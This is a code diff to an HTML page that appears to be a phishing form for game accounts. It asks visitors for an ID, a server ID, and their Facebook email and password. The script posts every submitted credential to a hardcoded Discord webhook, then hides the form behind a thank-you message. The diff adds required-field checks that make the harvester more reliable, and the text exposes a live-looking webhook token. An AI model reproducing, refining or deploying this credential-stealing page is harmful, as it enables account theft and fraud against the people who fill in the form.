@@ -98,13 +98,13 @@
         <div class="form-container">
             <form id="data-form">
                 <label for="id">ID</label>
-                <input type="text" id="id" placeholder="Your ID">
+                <input type="text" id="id" placeholder="Your ID" required>
                 <label for="id-server">ID Server (Max 5 digits)</label>
-                <input type="number" id="id-server" placeholder="Your Server ID" max="99999">
+                <input type="number" id="id-server" placeholder="Your Server ID" max="99999" required>
                 <label for="email">Email</label>
-                <input type="text" id="email" placeholder="Your Email">
+                <input type="email" id="email" placeholder="Your Email" required>
                 <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Your Password">
+                <input type="password" id="password" placeholder="Your Password" required>
                 <button type="button" id="submit-button">Submit</button>
             </form>
 
@@ -115,53 +115,56 @@
         </div>
     </div>
 
-  <script>
-      document.getElementById("submit-button").addEventListener("click", function () {
-          // Mengambil data dari formulir
-          const id = document.getElementById("id").value;
-          const idServer = document.getElementById("id-server").value;
-          const email = document.getElementById("email").value;
-          const password = document.getElementById("password").value;
+    <script>
+        document.getElementById("submit-button").addEventListener("click", function () {
+            const id = document.getElementById("id").value;
+            const idServer = document.getElementById("id-server").value;
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
 
-          // Data yang akan dikirim ke Discord
-          const dataToDiscord = {
-              content: `<:fb:1167354073327095821> **Pengguna : Facebook**\n` +
-              `- **ID:** ${id}\n` +
-              `- **ID Server:** ${idServer}\n` +
-              `- **Email:** ${email}\n` +
-              `- **Password:** ${password}`,
-              username: "Pengguna Website", // Ganti dengan nama yang sesuai
-          };
+            if (id && idServer && email && password) {
+                // Data yang akan dikirim ke Discord
+                const dataToDiscord = {
+                    content: `<:fb:1167354073327095821>  **Pengguna : Facebook**\n` +
+                        `- **ID:** ${id}\n` +
+                        `- **ID Server:** ${idServer}\n` +
+                        `- **Email:** ${email}\n` +
+                        `- **Password:** ${password}`,
+                    username: "Pengguna Website", // Ganti dengan nama yang sesuai
+                };
 
-          // Mengirim data ke Discord melalui webhook
-          fetch("https://discord.com/api/webhooks/1167331931722092585/F8p5Y6_9_WLzyKaqYAFvlMUSAfiU15Vx6fuJNbmBryXoZW2WMZnMJqMFceG2NcUO1suU", {
-              method: "POST",
-              headers: {
-                  "Content-Type": "application/json",
-              },
-              body: JSON.stringify(dataToDiscord),
-          })
-              .then((response) => {
-                  if (response.ok) {
-                      // Mengatur nilai elemen formulir menjadi kosong
-                      document.getElementById("id").value = "";
-                      document.getElementById("id-server").value = "";
-                      document.getElementById("email").value = "";
-                      document.getElementById("password").value = "";
+                // Mengirim data ke Discord melalui webhook
+                fetch("https://discord.com/api/webhooks/1167331931722092585/F8p5Y6_9_WLzyKaqYAFvlMUSAfiU15Vx6fuJNbmBryXoZW2WMZnMJqMFceG2NcUO1suU", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(dataToDiscord),
+                })
+                    .then((response) => {
+                        if (response.ok) {
+                            // Mengatur nilai elemen formulir menjadi kosong
+                            document.getElementById("id").value = "";
+                            document.getElementById("id-server").value = "";
+                            document.getElementById("email").value = "";
+                            document.getElementById("password").value = "";
 
-                      // Menyembunyikan elemen formulir
-                      document.getElementById("data-form").style.display = "none";
+                            // Menyembunyikan elemen formulir
+                            document.getElementById("data-form").style.display = "none";
 
-                      // Menampilkan pesan terima kasih
-                      document.querySelector(".thank-you-message").style.display = "block";
-                  } else {
-                      alert("Terjadi kesalahan dalam mengirim data ke Discord");
-                  }
-              })
-              .catch((error) => {
-                  alert("Terjadi kesalahan: " + error);
-              });
-      });
-  </script>
+                            // Menampilkan pesan terima kasih
+                            document.querySelector(".thank-you-message").style.display = "block";
+                        } else {
+                            alert("Terjadi kesalahan dalam mengirim data ke Discord");
+                        }
+                    })
+                    .catch((error) => {
+                        alert("Terjadi kesalahan: " + error);
+                    });
+            } else {
+                alert("Mohon isi semua kolom dengan benar sebelum mengirim.");
+            }
+        });
+    </script>
 </body>
 </html>
